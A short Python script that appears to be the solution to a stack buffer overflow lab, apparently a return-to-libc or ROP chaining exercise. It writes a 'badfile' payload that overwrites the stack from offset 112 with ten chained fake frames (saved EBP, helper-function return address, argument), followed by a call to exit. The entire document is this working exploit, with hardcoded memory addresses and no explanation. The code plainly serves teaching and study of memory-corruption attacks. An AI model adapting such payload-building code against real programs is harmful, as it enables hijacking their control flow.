#!/usr/bin/python3 
import sys 

content = bytearray(0xaa for i in range(1000))
ebp_value = 0xffffd138 
helper_addr = 0x56556315 + 7     # skip prologue 
exit_addr = 0xf7e05f80 
start = 112

for i in range(0, 10):

    # ebp 
    ebp_value += 12
    content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little')   
    start += 4

    # return address
    content[start:start+4] = (helper_addr).to_bytes(4, byteorder='little') 
    start += 4 

    # first argument
    content[start:start+4] = (0xaabbccdd).to_bytes(4, byteorder='little')   
    start += 4

# exit
content[start:start+4] = (0xffffffff).to_bytes(4, byteorder='little')
start += 4
content[start:start+4] = (exit_addr).to_bytes(4, byteorder='little')
start += 4
content[start:start+4] = (0xaabbccdd).to_bytes(4, byteorder='little')

with open("badfile", "wb") as f:
    f.write(content)
